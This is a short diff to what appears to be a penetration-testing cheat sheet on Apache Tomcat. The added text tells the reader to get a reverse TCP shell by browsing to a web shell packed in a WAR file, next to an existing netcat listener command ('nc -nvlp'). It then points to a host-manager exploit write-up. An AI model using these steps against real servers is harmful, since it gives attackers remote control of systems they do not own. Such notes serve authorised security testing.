@@ -323,6 +323,10 @@ Create your handler
 
 nc -nvlp <PORT>
 
+You can then reverse tcp by navigating to your web shell that you compressed in your war file.
+
+http://target/webshell/index.jsp
+
 ```
 ### [Exploiting host-manager]
 https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/
